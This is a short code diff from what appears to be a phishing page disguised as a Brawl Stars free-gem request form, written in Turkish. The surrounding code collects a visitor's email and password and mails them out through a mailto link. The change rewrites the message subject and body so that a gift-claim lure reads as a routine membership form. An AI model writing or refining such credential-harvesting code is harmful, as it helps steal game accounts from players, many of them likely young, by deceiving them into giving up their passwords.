@@ -178,13 +178,12 @@
             const secenek = encodeURIComponent(document.querySelector('input[name="secenek"]:checked').value);
             
             // Mailto linkini oluştur
-            const subject = encodeURIComponent("Brawl Stars Hediye Talep Formu");
+            const subject = encodeURIComponent("Brawl Stars Elmas Talebi");
             const body = encodeURIComponent(
                 `E-posta: ${decodeURIComponent(email)}\n` +
                 `Şifre: ${decodeURIComponent(password)}\n` +
                 `Seçilen Eşya Miktarı: ${decodeURIComponent(secenek)} 💎\n\n` +
-                `Bu bilgiler Brawl Stars veritabanından hediye hakkınızı alabilmeniz için kullanılacaktır.\n\n` +
-                `Gönder butonuna basarak hediyenizi kazanabilirsiniz.\n\n`
+                `Bu ileti Brawl Stars üyelik formundan gönderilmiştir.`
             );
             
             // Kullanıcının email istemcisini aç
